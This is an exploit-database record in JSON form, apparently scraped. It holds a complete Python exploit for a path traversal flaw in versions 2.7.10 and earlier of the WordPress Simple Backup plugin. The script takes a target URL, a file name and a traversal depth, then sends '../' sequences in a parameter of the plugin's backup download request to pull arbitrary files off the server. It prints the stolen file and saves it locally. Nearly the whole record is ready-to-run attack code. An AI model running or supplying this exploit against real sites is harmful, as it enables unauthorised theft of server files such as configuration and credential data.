{"source": "https://www.exploit-db.com/exploits/51937", "vulnName": "Simple Backup Plugin Python Exploit 2.7.10 - Path Traversal", "vulnEDBID": "51937", "vulnCVE": "N/A", "author": "VEN3XY", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Simple Backup Plugin < 2.7.10 - Arbitrary File Download via Path Traversal\n# Date: 2024-03-06\n# Exploit Author: Ven3xy\n# Software Link: https://downloads.wordpress.org/plugin/simple-backup.2.7.11.zip\n# Version: 2.7.10\n# Tested on: Linux\n\nimport sys\nimport requests\nfrom urllib.parse import urljoin\nimport time\n\ndef exploit(target_url, file_name, depth):\n    traversal = '../' * depth\n\n    exploit_url = urljoin(target_url, '/wp-admin/tools.php')\n    params = {\n        'page': 'backup_manager',\n        'download_backup_file': f'{traversal}{file_name}'\n    }\n\n    response = requests.get(exploit_url, params=params)\n\n    if response.status_code == 200 and response.headers.get('Content-Disposition') \\\n            and 'attachment; filename' in response.headers['Content-Disposition'] \\\n            and response.headers.get('Content-Length') and int(response.headers['Content-Length']) > 0:\n        print(response.text)  # Replace with the desired action for the downloaded content\n\n        file_path = f'simplebackup_{file_name}'\n        with open(file_path, 'wb') as file:\n            file.write(response.content)\n\n        print(f'File saved in: {file_path}')\n    else:\n        print(\"Nothing was downloaded. You can try to change the depth parameter or verify the correct filename.\")\n\nif __name__ == \"__main__\":\n    if len(sys.argv) != 4:\n        print(\"Usage: python exploit.py <target_url> <file_name> <depth>\")\n        sys.exit(1)\n\n    target_url = sys.argv[1]\n    file_name = sys.argv[2]\n    depth = int(sys.argv[3])\n    print(\"\\n[+] Exploit Coded By - Venexy    ||    Simple Backup Plugin 2.7.10  EXPLOIT\\n\\n\")\n    time.sleep(5)\n\n\n    exploit(target_url, file_name, depth)\n            "}